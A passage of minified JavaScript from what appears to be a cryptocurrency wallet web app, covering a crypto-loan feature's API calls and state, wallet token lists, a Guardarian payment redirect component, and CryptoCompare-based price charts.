            te.createAction)("@borrow/setUserLoans.COMMIT")(),
            setIsLoadingUserLoans: (0,
            te.createAction)("@borrow/setIsLoadingUserLoans.COMMIT")(),
            setLoanCurrencies: (0,
            te.createAction)("@borrow/setLoanCurrencies.COMMIT")(),
            setSystemCreateStatus: (0,
            te.createAction)("@borrow/setSystemCreateStatus.COMMIT")()
        }
          , fetchLoanCurrencies = () => async e => {
            const t = undefined
              , a = (await v3.get("/v2/currencies?is_enabled=true")).data.response
              , n = await fetchFletcherAllList()
              , r = a.filter((e => e.is_loan_receive_enabled)).map((e => ({
                ...e,
                currency: e.code.toLowerCase(),
                network: e.network.toLowerCase(),
                title: e.name,
                minAmount: Number(e.loan_receive_min_amount),
                subtitle: (0,
                be.xG)(e.code),
                additional_fees: Number(e.loan_deposit_additional_fee)
            })))
              , l = a.filter((e => e.is_loan_deposit_enabled)).map((e => ({
                ...e,
                currency: e.code.toLowerCase(),
                network: e.network.toLowerCase(),
                title: e.name,
                minAmount: Number(e.loan_deposit_min_amount.toString()),
                subtitle: (0,
                be.xG)(e.code),
                additional_fees: Number(e.loan_deposit_additional_fee)
            })));
            e(_3.setLoanCurrencies({
                currencies: {
                    loans: r,
                    deposit: l,
                    fletcherAllTokens: n
                }
            }))
        }
          , fetchUserLoans = () => async (e, t) => {
            var a, n;
            e(_3.setIsLoadingUserLoans({
                isLoadingUserLoans: !0
            }));
            await e(borrowGetUser());
            const {data: r} = await v3.get("/v2/loans", {
                validateStatus: () => !0
            })
              , l = t()
              , s = x3(l)
              , i = F3(l)
              , o = null == r || null === (a = r.response) || void 0 === a || null === (n = a.filter((e => "failed_by_partner" !== e.status && "confirmed" !== e.status))) || void 0 === n ? void 0 : n.map((e => mapperBorrowV1ToV2Loan(e, i, s)));
            !1 === r.result && ge.b.error(ge.d.LOAN_GET_LOANS_LIST_ERROR);
            e(_3.setUserLoans({
                loans: !1 === r.result ? [] : o
            }));
            e(_3.setIsLoadingUserLoans({
                isLoadingUserLoans: !1
            }))
        }
          , fetchLoanById = e => async (t, a) => {
            await t(borrowGetUser());
            const n = a()
              , r = x3(n)
              , l = F3(n)
              , {data: s} = await v3.get(`/v2/loans/${e}`, {
                validateStatus: () => !0
            });
            return mapperBorrowV1ToV2Loan(s.response, l, r)
        }
          , estimateLoanAmount = e => {
            let {codeFrom: t, codeTo: a, amount: n, from_network: r, to_network: l, ltvPercent: s, exchange: i="direct"} = e;
            return async () => {
                const e = {
                    from_code: t,
                    to_code: a,
                    from_network: r,
                    to_network: l,
                    amount: n,
                    exchange: i,
                    ltv_percent: s
                }
                  , {data: o} = await v3.get("/v2/loans/estimate", {
                    params: e,
                    validateStatus: () => !0
                });
                if (!o.result)
                    return o;
                const c = undefined;
                return {
                    amount_from: parseFloat(o.response.amount_from),
                    amount_to: parseFloat(o.response.amount_to),
                    interest_percent: parseFloat(o.response.interest_percent),
                    interest_amounts: o.response.interest_amounts,
                    down_limit: parseFloat(o.response.down_limit)
                }
            }
        }
          , createUserLoan = e => async () => {
            try {
                const {data: t} = await v3.post("/v2/loans", e);
                return t.response
            } catch (e) {
                return {
                    status: !1
                }
            }
        }
          , cancelUserLoan = e => async () => {
            try {
                const {data: t} = await v3.post(`/v2/partners/loan/${e}`, {
                    status: "FAILED_BY_PARTNER"
                });
                return t.response
            } catch (e) {
                return {
                    status: !1
                }
            }
        }
          , confirmCreateLoan = (e, t) => async () => {
            try {
                var a, n, r;
                const c = {
                    loan: {
                        receive_address: t
                    },
                    agreed_to_tos: !0
                }
                  , u = await v3.post(`/v2/loans/${e.loan_id}/confirm`, c);
                if (null != u && null !== (a = u.data) && void 0 !== a && a.result && null != u && null !== (n = u.data) && void 0 !== n && null !== (r = n.response) && void 0 !== r && r.address) {
                    var l, s, i, o;
                    return {
                        address: null == u || null === (l = u.data) || void 0 === l || null === (s = l.response) || void 0 === s ? void 0 : s.address,
                        extraId: null == u || null === (i = u.data) || void 0 === i || null === (o = i.response) || void 0 === o ? void 0 : o.extraId
                    }
                }
            } catch (e) {
                console.error("err", e)
            }
            return {
                status: !1
            }
        }
          , calculateNewDownPrice = (e, t) => async () => {
            try {
                const {data: a} = await v3.get(`/v2/loans/${e}/increase/estimate/?amount=${t}`);
                return a.result ? a.response : {
                    status: !1
                }
            } catch (e) {}
            return {
                status: !1
            }
        }
          , createIncreseDeposit = (e, t) => async () => {
            const {data: a} = await v3.post(`/v2/loans/${e}/increase`, {
                deposit: {
                    amount: parseFloat(t)
                }
            });
            return a.response
        }
          , CreatePledgeRedemptionTx = (e, t, a) => async () => {
            const {data: n} = await v3.post(`/v2/loans/${e}/pledge`, {
                address: t,
                extra_id: a
            });
            return n.response
        }
          , updateUserLoanCredentials = e => async () => {
            const {data: t} = await v3.put("/v2/users", e);
            return t.response
        }
          , fetchSystemBorrowStatus = () => async e => {
            try {
                const {data: t} = await v3.get("/v2/partners/settings/can-create-loans");
                e(_3.setSystemCreateStatus({
                    systemCreateStatus: t.response
                }))
            } catch (t) {
                e(_3.setSystemCreateStatus({
                    systemCreateStatus: !1
                }))
            }
        }
          , w3 = "borrow"
          , b3 = null
          , k3 = {
            currencies: {
                loans: [],
                deposit: [],
                fletcherAllTokens: []
            },
            isFullLoading: !1,
            systemCreateStatus: void 0,
            loans: [],
            isLoadingUserLoans: !0,
            user: null
        }
          , S3 = (0,
        Ru.Z)({
            [(0,
            te.getType)(_3.setUser)]: (e, t) => {
                let {payload: {user: a}} = t;
                return {
                    ...e,
                    user: a
                }
            }
            ,
            [(0,
            te.getType)(_3.setUserLoans)]: (e, t) => {
                let {payload: {loans: a}} = t;
                return {
                    ...e,
                    loans: a
                }
            }
            ,
            [(0,
            te.getType)(_3.setIsLoadingUserLoans)]: (e, t) => {
                let {payload: {isLoadingUserLoans: a}} = t;
                return {
                    ...e,
                    isLoadingUserLoans: a
                }
            }
            ,
            [(0,
            te.getType)(_3.setLoanCurrencies)]: (e, t) => {
                let {payload: {currencies: a}} = t;
                return {
                    ...e,
                    currencies: a
                }
            }
            ,
            [(0,
            te.getType)(_3.setSystemCreateStatus)]: (e, t) => {
                let {payload: {systemCreateStatus: a}} = t;
                return {
                    ...e,
                    systemCreateStatus: a,
                    isFullLoading: !0
                }
            }
        }, k3)
          , borrowSelector = e => e.borrow
          , C3 = (0,
        _t.P1)(borrowSelector, (e => e.isFullLoading || !1))
          , N3 = (0,
        _t.P1)(borrowSelector, (e => e.systemCreateStatus || !1))
          , T3 = (0,
        _t.P1)(borrowSelector, (e => e.loans || []))
          , A3 = (0,
        _t.P1)(borrowSelector, (e => e.isLoadingUserLoans || !1))
          , x3 = (0,
        _t.P1)(borrowSelector, (e => e.currencies || []))
          , I3 = (0,
        _t.P1)(x3, (e => (t, a) => {
            var n;
            return null == e || null === (n = e.loans) || void 0 === n ? void 0 : n.find((e => (0,
            y3.Z)(t || "") === (0,
            y3.Z)(e.currency) && (0,
            y3.Z)(a || "") === (0,
            y3.Z)(e.network)))
        }
        ))
          , P3 = (0,
        _t.P1)(x3, (e => (t, a) => {
            var n;
            return null == e || null === (n = e.deposit) || void 0 === n ? void 0 : n.find((e => (0,
            y3.Z)(t || "") === (0,
            y3.Z)(e.currency) && (0,
            y3.Z)(a || "") === (0,
            y3.Z)(e.network)))
        }
        ))
          , L3 = (0,
        _t.P1)(T3, (e => t => e.find((e => String(e.loan_id) === String(t)))))
          , F3 = (0,
        _t.P1)(borrowSelector, (e => e.user))
          , getNewTokensForExchange = (e, t) => {
            const a = {};
            e.subWallets.forEach((e => {
                a[(0,
                be.rX)(e.currency)] = !0
            }
            ));
            return t.subWallets.filter((e => {
                const t = (0,
                be.rX)(e.currency);
                if (a[t])
                    return !1;
                a[t] = !0;
                return !0
            }
            ))
        }
          , useWalletsToBorrow = () => {
            const e = (0,
            $.v9)(x3)
              , {fletcherAllTokens: t} = e
              , a = (0,
            $.v9)($c)
              , n = a.filter((e => {
                var t;
                return !(null === (t = Se.Z.getRootMetadata(e.currency)) || void 0 === t || !t.coin || e.isTestnet)
            }
            ));
            if (!t || !t.length)
                return {
                    toWallets: n,
                    newTokens: [],
                    newCoins: []
                };
            const r = []
              , l = []
              , s = t.filter((t => e.loans.some((e => e.currency && (0,
            y3.Z)(t.ticker) === (0,
            y3.Z)(e.currency) && "network"in e && (0,
            y3.Z)(t.family) === (0,
            y3.Z)(e.network)))));
            n.forEach((e => {
                const t = s.filter((t => (0,
                y3.Z)(t.family) === (0,
                y3.Z)(e.currency)))
                  , a = fake_to_real_wallet_fakeSubWalletsForTokens(e, t)
                  , n = getNewTokensForExchange(e, a);
                r.push(...n)
            }
            ));
            const i = e.loans.filter((e => (0,
            y3.Z)(e.network) === (0,
            y3.Z)(e.currency) && !a.find((t => t.currency === (0,
            y3.Z)(e.network)))));
            i.forEach((e => {
                const t = undefined
                  , a = (new (_e.ZP.getClass({
                    currency: e.currency
                }))).recoverFromPlainObject({
                    uuid: (0,
                    he.Z)().slice(0, 8),
                    ticker: e.currency,
                    title: e.title,
                    currency: e.currency
                });
                l.push(a)
            }
            ));
            const o = s.filter((e => !n.find((t => (0,
            y3.Z)(t.currency) === (0,
            y3.Z)(e.family)))));
            o.forEach((e => {
                const t = undefined
                  , a = (new (_e.ZP.getClass({
                    currency: e.family
                }))).recoverFromPlainObject({
                    uuid: (0,
                    he.Z)().slice(0, 8),
                    ticker: e.family,
                    title: e.family,
                    currency: e.family
                })
                  , n = fake_to_real_wallet_fakeSubWalletsForTokens(a, [e])
                  , l = getNewTokensForExchange(a, n);
                r.push(...l)
            }
            ));
            return {
                newTokens: r,
                toWallets: n,
                newCoins: l
            }
        }
          , hooks_use_wallets_to = () => {
            const e = (0,
            $.v9)(GO)
              , t = (0,
            $.v9)(MO)
              , a = (0,
            $.v9)(Fi)
              , n = (0,
            $.v9)(Bo)
              , r = Se.Z.getTickersByCoinAdapterFeatures((e => e.isActiveCreate)).map((e => (0,
            be.II)(e))).filter((e => Boolean(e)))
              , [l,s] = (0,
            O.useState)({})
              , {sortByRank: i} = useCMCRate();
            (0,
            O.useEffect)(( () => {
                if (!0 === n)
                    return;
                let e = !1;
                (async () => {
                    let n;
                    n = a.length ? [...a] : await fetchFletcherTokens();
                    if (!e) {
                        n = n.filter((e => "pax" !== e.ticker));
                        n.forEach((e => {
                            if (t && (null == e ? void 0 : e.family)in t && t[null == e ? void 0 : e.family].find((t => {
                                var a, n;
                                return null !== (a = (null == t ? void 0 : t.toLowerCase()) === (null == e || null === (n = e.contract) || void 0 === n ? void 0 : n.toLowerCase())) && void 0 !== a ? a : ""
                            }
                            ))) {
                                l[null == e ? void 0 : e.family] || (l[null == e ? void 0 : e.family] = []);
                                l[e.family].push({
                                    ...getTokenParams(e),
                                    family: e.family
                                })
                            }
                        }
                        ));
                        s({
                            ...l
                        })
                    }
                }
                )();
                return () => {
                    e = !0
                }
            }
            ), [t, n]);
            let o = (0,
            $.v9)($c);
            o = o.filter((t => !!e && e.includes(t.currency)));
            const c = []
              , u = [];
            e.filter((e => !o.find((t => t.currency.toLowerCase() === e.toLowerCase())))).forEach((e => {
                const t = r.find((t => {
                    var a, n;
                    return (null === (a = t.currency) || void 0 === a ? void 0 : a.toLowerCase()) === e.toLowerCase() || (null === (n = t.ticker) || void 0 === n ? void 0 : n.toLowerCase()) === e.toLowerCase()
                }
                ));
                if (t)
                    try {
                        const e = undefined
                          , a = (new (_e.ZP.getClass({
                            currency: t.currency
                        }))).recoverFromPlainObject({
                            uuid: (0,
                            he.Z)().slice(0, 8),
                            ticker: t.currency,
                            title: t.title,
                            currency: t.currency
                        });
                        c.push(a)
                    } catch (e) {
                        ge.b.error(ge.d.BUYSELL_SELL_COINS_FILTER_ERROR, {}, e)
                    }
            }
            ));
            o.forEach((e => {
                const t = l[e.currency.toLowerCase()];
                if (!t)
                    return;
                const a = fake_to_real_wallet_fakeSubWalletsForTokens(e, t)
                  , n = getNewTokensForExchange(e, a);
                u.push(...n)
            }
            ));
            const d = Object.keys(l)
              , m = [];
            d.forEach((e => {
                o.find((t => t.currency.toLowerCase() === e.toLowerCase())) || m.push(...l[e])
            }
            ));
            m.forEach((e => {
                try {
                    const t = undefined
                      , a = (new (_e.ZP.getClass({
                        currency: e.family
                    }))).recoverFromPlainObject({
                        uuid: (0,
                        he.Z)().slice(0, 8),
                        ticker: e.family,
                        title: e.family,
                        currency: e.family
                    })
                      , n = fake_to_real_wallet_fakeSubWalletsForTokens(a, [e])
                      , r = getNewTokensForExchange(a, n);
                    u.push(...r)
                } catch (e) {
                    ge.b.error(ge.d.BUYSELL_SELL_TOKENS_FILTER_ERROR, {}, e)
                }
            }
            ));
            const p = undefined
              , f = undefined;
            return {
                newTokens: (0,
                O.useMemo)(( () => u.sort(i)), [u, i]),
                newCoins: (0,
                O.useMemo)(( () => c.sort(i)), [c, i])
            }
        }
          , W3 = "confirm_guardarianIframe_2DLV2"
          , GuardarianConfirm_GuardarianConfirm = e => {
            let {paymentCreateTransaction: t, onBeforeConfirm: a, children: n} = e;
            const [r,l] = (0,
            O.useState)(!1)
              , [s,i] = (0,
            O.useState)(!1)
              , [o,c] = (0,
            O.useState)();
            (0,
            O.useEffect)(( () => {
                i(!1)
            }
            ), [t, a, n]);
            const handleSubmit = async e => {
                if (r)
                    return;
                const n = cc.$.txPerformanceStart();
                l(!0);
                i(!1);
                if (a) {
                    await a(e);
                    if (e.defaultPrevented) {
                        l(!1);
                        i(!0);
                        return
                    }
                }
                try {
                    var s;
                    const e = await createGuardarianTransaction(t);
                    if (null != e && null !== (s = e.originalTransaction) && void 0 !== s && s.paymentUrl) {
                        const t = new URL(e.originalTransaction.paymentUrl)
                          , a = `https://${document.location.host}/app/buy/gardarian/view/${e._id}`;
                        t.searchParams.set("redirectAfterPaidUrl", a);
                        (0,
                        M.d)() ? c(t.href) : window.location.replace(t.href)
                    }
                } catch (e) {
                    console.warn(e);
                    paymentError({
                        partner: "guardarian",
                        paymentCreateTransaction: t,
                        error: e
                    });
                    i(!0);
                    return
                } finally {
                    l(!1)
                }
                paymentSuccess({
                    partner: "guardarian",
                    paymentCreateTransaction: t
                });
                const o = cc.$.txPerformanceEnd(n);
                paymentPerformanceTx({
                    partner: "guardarian",
                    paymentCreateTransaction: t,
                    txPerformance: o
                })
            }
            ;
            return O.createElement(O.Fragment, null, o && O.createElement("webview", {
                src: o,
                className: W3
            }), n({
                isPartnerLoading: r,
                isPartnerError: s,
                handleSubmit
            }))
        }
        ;
        var R3 = a(45212)
          , B3 = a.n(R3);
        const O3 = "view_wrapper_wpjHJ app_wrapperBlock_2EpA3"
          , D3 = "view_wrapperHeader_1xiFp"
          , M3 = "view_headerFooterElipce_2oddZ"
          , U3 = "view_headerFooterElipceLeft_1wrNC"
          , G3 = "view_headerFooterElipceRight_121Wv"
          , V3 = "view_circle_2mb9K"
          , K3 = "view_circleClock_rTca6"
          , H3 = "view_iconClock_3cZnh"
          , z3 = "view_wrapperLoader_2GNWs"
          , j3 = "view_headerTitle_JVfDt"
          , $3 = "view_headerText_2hinP"
          , Z3 = "view_headerFooter_12dJJ"
          , Y3 = "view_wrapperBody_1rG4J"
          , q3 = "view_wrapperBodyTitle_b_5od"
          , X3 = "view_wrapperBodySubTitle_3UfKY"
          , Q3 = "view_wrapperBodyText_17-Oq"
          , J3 = "view_wrapperBodySubText_-U7HN"
          , e9 = "view_linkToSimplex_3VxQh"
          , t9 = "view_iconCopy_4zsJd"
          , a9 = "view_iconCopyOk_3Zdo4"
          , n9 = "view_wrapperBodyFooter_1YcHL"
          , r9 = "view_wrapperFooter_1Mz_J"
          , l9 = "view_footerButtons_fcdn_"
          , s9 = "view_footerLink_3_-r7"
          , i9 = "view_rightBlock_2i-N_"
          , o9 = "view_leftBlock_1olY0"
          , c9 = "view_userSelect_2z8pI";
        var u9 = a(98047)
          , d9 = a.n(u9)
          , m9 = a(57008)
          , p9 = a.n(m9);
        function useChart(e) {
            const t = O.createRef()
              , [n,r] = (0,
            O.useState)(null);
            (0,
            O.useEffect)(( () => {
                t.current && !n && fetch();
                async function fetch() {
                    var n;
                    const l = await Promise.all([a.e(4736), a.e(6700)]).then(a.t.bind(a, 17757, 23));
                    Object.assign(null === (n = l.defaults || l.default.defaults) || void 0 === n ? void 0 : n.global, {
                        defaultFontFamily: "'Roboto', sans-serif"
                    });
                    if (t.current) {
                        const a = new l.default(t.current.getContext("2d"),e);
                        r(a)
                    }
                }
            }
            ), [t, e]);
            (0,
            O.useEffect)(( () => () => {
                n && n.destroy()
            }
            ), []);
            return [n, t]
        }
        const f9 = {
            type: "line",
            data: {
                labels: [],
                datasets: [{
                    backgroundColor: "rgba(27,162,122, 0.1)",
                    lineTension: 0,
                    borderColor: "rgb(27,162,122)",
                    data: [],
                    pointStyle: "line",
                    pointRadius: 0
                }]
            },
            options: {
                tooltips: {
                    caretSize: 0,
                    displayColors: !1,
                    mode: "index",
                    intersect: !1
                },
                legend: {
                    display: !1
                },
                animation: {
                    duration: 300
                },
                responsiveAnimationDuration: 0,
                responsive: !0,
                hover: {
                    mode: "nearest",
                    intersect: !0
                },
                offset: 0,
                scales: {
                    xAxes: [{
                        stacked: !0,
                        ticks: {
                            fontSize: 12,
                            maxRotation: 0,
                            maxTicksLimit: 1,
                            fontColor: "rgb(196,196,196)"
                        },
                        gridLines: {
                            zeroLineWidth: 0
                        },
                        display: !0
                    }],
                    yAxes: [{
                        stacked: !0,
                        gridLines: {
                            color: "#f1f1f1"
                        },
                        ticks: {
                            maxRotation: 0,
                            maxTicksLimit: 5,
                            fontSize: 10,
                            fontColor: "rgb(196,196,196)"
                        },
                        position: "right",
                        display: !0
                    }]
                }
            }
        }
          , E9 = "chart_wrapper_1Z7wf undefined"
          , h9 = "chart_await_2Y1Dx"
          , g9 = "chart_gradient_140Ii"
          , y9 = "chart_imageWrapper_1l7pC"
          , v9 = "chart_isVisible_2WGHS"
          , _9 = "chart_chartWrapper_2vAUZ"
          , w9 = "chart_titleWrapper_2qTqz"
          , b9 = "chart_periods_2aqtA"
          , k9 = "chart_isActive_3KK63"
          , S9 = "chart_currentRate_3IdKD"
          , C9 = "chart_loader_28Pyv"
          , N9 = "chart_chartTitle_3yXid"
          , T9 = "chart_currIcon__I7Ju"
          , A9 = "chart_currentRateName_3xWER"
          , x9 = "chart_currentRateValue_3CY86"
          , I9 = "chart_currentRateGray_185ru"
          , P9 = "chart_periodsWrapper_3rbDG"
          , L9 = "chart_arrowIcon_1kZRd"
          , F9 = "chart_increase_-mRj2"
          , W9 = "chart_decrease_2Et-f"
          , R9 = "chart_changeWrapper_1kTPD"
          , B9 = "chart_changeWrapperIncrease_pI9Lw"
          , O9 = "chart_changeWrapperDecrease_1RUVz"
          , D9 = "chart_currentRateTitle_ZEm1E";
        var M9 = a(42693)
          , U9 = a.n(M9);
        const G9 = ee.P.create({
            name: "reducer-rates"
        })
          , V9 = 1
          , K9 = 7
          , H9 = 31
          , z9 = 183
          , j9 = 365
          , $9 = 1 / 0
          , Z9 = Jn()((function() {
            for (var e = arguments.length, t = new Array(e), a = 0; a < e; a++)
                t[a] = arguments[a];
            return U9()(( () => Jf().get(...t)))
        }
        ), {
            cacheKey: e => JSON.stringify(e)
        })
          , Y9 = ["KISHU", "BABYDOGE"]
          , q9 = ["HGOLD", "SATT"]
          , X9 = ["YEC"]
          , Q9 = ["STETH"]
          , J9 = ["CUSDC", "CDAI"]
          , e4 = ["WFIL"]
          , t4 = ["BCHA", "GOVI", "GHX"]
          , a4 = ["GMT"]
          , n4 = ["SRX"]
          , r4 = ["WAM"]
          , gerExchangeByCurrency = e => Y9.includes(e) ? "OKEX" : q9.includes(e) ? "DigiFinex" : X9.includes(e) ? "SafeCoin" : Q9.includes(e) ? "curve" : J9.includes(e) ? "uniswap" : e4.includes(e) ? "sushiswap" : t4.includes(e) ? "Kucoin" : a4.includes(e) ? "Exmo" : n4.includes(e) ? "HitBTC" : r4.includes(e) ? "Gateio" : "CCCAGG"
          , l4 = [["AYA", "EUR"]]
          , i4 = ["WAM"]
          , getTryConversion = e => !l4.find((t => t[0] === e[0] && t[1] === e[1]))
          , o4 = {
            ONG: "ONGAS",
            BSC: "BNB",
            XNO: "NANO",
            ETHARB: "ETH",
            ETHOP: "ETH"
        }
          , patchCurrencyForCryptoCompare = e => o4[e] || e
          , fetch_full_histo_fetchFullHisto = (e, t, a, n, r) => async (l, s) => {
            try {
                let l;
                l = a ? null == a ? void 0 : a.toUpperCase() : (0,
                Sd.selectedLocalCurrency)(s()).toUpperCase();
                let i = e.toUpperCase();
                i = patchCurrencyForCryptoCompare(i);
                let o = "USD" === l && i4.includes(i) ? "USDT" : l;
                const c = i === o;
                c && (o = "USD");
                const u = {
                    [$9]: {
                        link: "histoday",
                        params: {
                            aggregate: 30,
                            allData: !0
                        }
                    },
                    [j9]: {
                        link: "histoday",
                        params: {
                            aggregate: r ? 2 : 8,
                            limit: r ? 180 : 45
                        }
                    },
                    [z9]: {
                        link: "histoday",
                        params: {
                            aggregate: r ? 1 : 4,
                            limit: r ? 180 : 45
                        }
                    },
                    [H9]: {
                        link: r ? "histohour" : "histoday",
                        params: {
                            aggregate: r ? 4 : 1,
                            limit: r ? 180 : 31
                        }
                    },
                    7: {
                        link: "histohour",
                        params: {
                            aggregate: r ? 1 : 4,
                            limit: r ? 168 : 42
                        }
                    },
                    1: {
                        link: r ? "histominute" : "histohour",
                        params: {
                            aggregate: r ? 8 : 1,
                            limit: r ? 180 : 24
                        }
                    }
                };
                let {link: d, params: m} = u[t]
                  , {link: p, params: f} = u[31];
                d = `https://min-api.cryptocompare.com/data/${d}`;
                const E = "https://min-api.cryptocompare.com/data/price";
                m = {
                    fsym: i,
                    tsym: o,
                    tryConversion: getTryConversion([i, o]),
                    e: gerExchangeByCurrency(i),
                    extraParams: "CryptoCompare",
                    ...m
                };
                p = `https://min-api.cryptocompare.com/data/${p}`;
                f = {
                    fsym: i,
                    tsym: o,
                    tryConversion: getTryConversion([i, o]),
                    e: gerExchangeByCurrency(i),
                    extraParams: "CryptoCompare",
                    ...f
                };
                const [{data: h},{data: g},{data: y}] = await Promise.all([Z9(d, {
                    params: m
                }), Z9(E, {
                    params: {
                        fsym: i,
                        tsyms: o
                    }
                }), Z9(p, {
                    params: f
                })]);
                if (!h || !h.Data || !h.Data.length) {
                    G9.warn("cant fetchFullHisto");
                    const e = undefined;
                    return {
                        resultData: n ? [{
                            x: (new Date).valueOf() - 864e5,
                            y: Number(n)
                        }, {
                            x: (new Date).valueOf(),
                            y: Number(n)
                        }] : [],
                        oneMonthDataResult: []
                    }
                }
                const resultDataMapper = e => e.Data.map(( (e, t, a) => {
                    let {time: r, close: l} = e;
                    const s = 1e3 * r;
                    return t === a.length - 1 ? {
                        x: s,
                        y: c && "USDT" !== i ? g[o] || Number(n) : Number(n) || g[o]
                    } : {
                        x: s,
                        y: l
                    }
                }
                ));
                let v = resultDataMapper(h);
                const _ = resultDataMapper(y);
                if (t !== 1 / 0)
                    return {
                        resultData: v,
                        oneMonthDataResult: _
                    };
                let w = !1;
                v = v.filter((e => {
                    let {y: t} = e;
                    t > 0 && (w = !0);
                    return 0 !== t || w
                }
                ));
                return {
                    resultData: v,
                    oneMonthDataResult: _
                }
            } catch (e) {
                G9.error("cant fetchFullHisto", e);
                return {
                    resultData: [],
                    oneMonthDataResult: []
                }
            }
        }
        ;
        function useChartData(e) {
            const t = useDispatch()
              , [a,n] = useState(null)
              , [r,l] = useState(!1)
              , [s,i] = useState(!1)
              , o = useRef()
              , {localCurrency: c} = useLocalCurrency()
              , u = "dd mmm"
              , {currency: d, family: m, smartContract: p, period: f, selectedFiat: E, actualRate: h} = e;
            useEffect(( () => {
                async function fetch() {
                    l(!0);
                    i(!1);
                    const a = e.config
                      , {resultData: r} = await t(fetchFullHisto(formatCurrency(d), f, E, h, !1));
                    a.data.labels = r.map(( (e, t, a) => {
                        let {x: n} = e;
                        if (t === a.length - 1) {
                            const e = undefined;
                            return new Date / 1e3
                        }
                        return n
                    }
                    ));
                    const s = Math.min(...r.map((e => {
                        let {y: t} = e;
                        return t
                    }
                    )));
                    a.data.datasets[0].data = r;
                    a.options.tooltips.callbacks = {};
                    a.options.tooltips.callbacks.title = e => {
                        let[t] = e;
                        return dateFormat(1e3 * t.xLabel, "dd mmm HH:00")
                    }
                    ;
                    a.options.tooltips.callbacks.label = e => `${toFormatAmount(e.yLabel) || ""} ${E ? E.toUpperCase() : c.toUpperCase()}`;
                    a.options.scales.yAxes[0].ticks.min = s < 1 && "usdt" === d ? .987 * s : s < 1 ? .85 * s : Math.floor(.85 * s);
                    const o = Math.round(r.length / 12);
                    e.cbRules ? a.options.scales.xAxes[0].ticks.callback = t => e.cbRules(t) : a.options.scales.xAxes[0].ticks.callback = (t, a) => a % o != 0 ? null : dateFormat(1e3 * t, e.dateFormats || u);
                    n({
                        ...a
                    });
                    l(!1);
                    i(!0)
                }
                clearTimeout(o.current);
                o.current = setTimeout(( () => {
                    fetch()
                }
                ), 1e3)
            }
            ), [d, m, p, f, E, h, e.config, e.dateFormats, c]);
            return [a, r, s]
        }
        const c4 = undefined
          , chart_Periods = e => {
            let {onPeriodSelect: t} = e;
            const a = j9
              , [n,r] = (0,
            O.useState)(a)
              , updateData = e => {
                r(e.period);
                t(e)
            }
            ;
            return O.createElement("div", {
                className: b9
            }, O.createElement("div", {
                className: P9
            }, O.createElement("div", {
                id: "buyChartChange1D",
                onClick: () => {
                    updateData({
                        dateFormats: "ddd, hh tt",
                        period: 1
                    })
                }
                ,
                className: Ht()({
                    [k9]: 1 === n
                })
            }, "1D"), O.createElement("div", {
                id: "buyChartChange1W",
                onClick: () => {
                    updateData({
                        dateFormats: "dd mmm",
                        period: 7
                    })
                }
                ,
                className: Ht()({
                    [k9]: 7 === n
                })
            }, "1W"), O.createElement("div", {
                id: "buyChartChange1M",
                onClick: () => {
                    updateData({
                        dateFormats: "dd mmm",
                        period: H9
                    })
                }
                ,
                className: Ht()({
                    [k9]: n === H9
                })
            }, "1M"), O.createElement("div", {
                id: "buyChartChange6M",
                onClick: () => {
                    updateData({
                        dateFormats: "dd mmm",
                        period: z9
                    })
                }
                ,
                className: Ht()({
                    [k9]: n === z9
                })
            }, "6M"), O.createElement("div", {
                id: "buyChartChange1Y",
                onClick: () => {
                    updateData({
                        dateFormats: "mmm yyyy",
                        period: j9
                    })
                }
                ,
                className: Ht()({
                    [k9]: n === j9
                })
            }, "1Y")))
        }
          , u4 = undefined
          , chart_Title = e => {
            let {currency: t, changeRate: a, selectedFiat: n, convertedToFiat: r, formattedCurrency: l} = e;
            return O.createElement("div", {
                className: w9
            }, O.createElement("div", {
                className: N9
            }, O.createElement(IconCurrency, {
                className: T9,
                currency: t
            }), O.createElement("div", {
                className: S9
            }, O.createElement("div", {
                className: D9
            }, O.createElement("div", {
                className: A9
            }, l), a && O.createElement("div", {
                className: Ht()(R9, a > 0 ? B9 : O9)
            }, (0,
            Ko.eq)(a, 0) ? "0" : (0,
            Ko.gt)(a, 0) ? `↑ ${a}` : `↓ ${Math.abs(Number(a))}`, "%")), O.createElement("span", {
                className: x9
            }, "1 ", l, " ≈", " ", O.createElement("span", {
                className: I9
            }, O.createElement(fiat_estimate_FiatEstimate, {
                selectedFiat: n,
                value: r,
                full: !0,
                withIcon: !0,
                isRate: !0
            }))))))
        }
          , d4 = undefined
          , chart_Waiting = e => {
            let {isVisible: t} = e;
            return O.createElement("div", {
                className: Ht()(h9, {
                    [v9]: t
                })
            })
        }
          , m4 = a.p + "7a40969232d7ad7899c5d1fa2fec83ff.svg"
          , p4 = a.p + "1ef340ff9f637d508b7eb04279d11629.svg"
          , f4 = a.p + "35437b1c5ac6c9de7ab2114772cfa46e.svg"
          , E4 = a.p + "01dc2f8cbed36034c736bf39f258f392.svg"
          , ChartError = e => {
            let {theme: t, isVisible: a} = e, n;
            const r = "Not available at the moment";
            n = (0,
            M.d)() ? "dark" === t ? m4 : p4 : "dark" === t ? f4 : E4;
            return O.createElement("div", {
                className: Ht()(y9, {
                    [v9]: a
                })
            }, O.createElement("img", {
                src: n,
                alt: r
            }))
        }
          , h4 = ChartError;
        let g4;
        !function(e) {
            e[e.IDLE = 1] = "IDLE";
            e[e.LOADING = 2] = "LOADING";
            e[e.ERROR = 3] = "ERROR"
        }(g4 || (g4 = {}));
        const use_chart_data_useChartData = e => {
            let {currency: t, family: a, smartContract: n, period: r, fiat: l, rate: s} = e;
            const i = (0,
            $.I0)()
              , [o,c] = (0,
            O.useState)(g4.IDLE)
              , [u,d] = (0,
            O.useState)(null)
              , m = (0,
            O.useRef)();
            (0,
            O.useEffect)(( () => {
                const fetch = async () => {
                    c(g4.LOADING);
                    try {
                        const e = await i(fetch_full_histo_fetchFullHisto((0,
                        be.xG)(t), r, l, s));
                        d(null == e ? void 0 : e.resultData);
                        c((null == e ? void 0 : e.resultData.length) > 0 ? g4.IDLE : g4.ERROR)
                    } catch {
                        c(g4.ERROR)
                    }
                }
                ;
                window.clearTimeout(m.current);
                m.current = window.setTimeout(( () => {
                    fetch()
                }
                ), 1e3)
            }
            ), [t, a, n, r, l, s]);
            return [u, o]
        }
          , y4 = use_chart_data_useChartData
          , getChartConfig = e => {
            let {config: t, data: a, fiat: n, dateFormats: r, defaultDateFormats: l, localCurrency: s, cbRules: i} = e;
            if (!t || !a)
                return;
            const o = {
                ...t
            }
              , c = Array.from(a);
            o.data.labels = c.map(( (e, t, a) => {
                let {x: n} = e;
                if (t === a.length - 1) {
                    const e = undefined;
                    return +new Date / 1e3
                }
                return n
            }
            ));
            const u = Math.min(...c.map((e => {
                let {y: t} = e;
                return t
            }
            )));
            o.data.datasets[0].data = c;
            o.options.tooltips.callbacks = {};
